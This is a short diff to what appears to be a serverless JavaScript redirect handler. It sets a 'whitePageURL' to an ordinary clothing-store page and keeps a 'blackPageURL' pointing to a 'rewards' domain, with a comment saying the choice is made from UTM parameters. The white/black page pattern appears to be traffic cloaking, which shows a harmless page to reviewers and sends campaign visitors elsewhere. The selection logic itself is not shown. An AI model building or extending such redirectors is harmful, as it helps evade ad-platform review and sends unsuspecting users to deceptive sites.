@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "";
+    const whitePageURL = "https://nomanwalksalone.com/collections/found-feather";
     const blackPageURL = "https://rwrds.wiki";
   
     // Parse the UTM parameters from the request URL
@@ -25,5 +25,3 @@ export default function handler(req, res) {
   
     res.end();
   }
-  
-
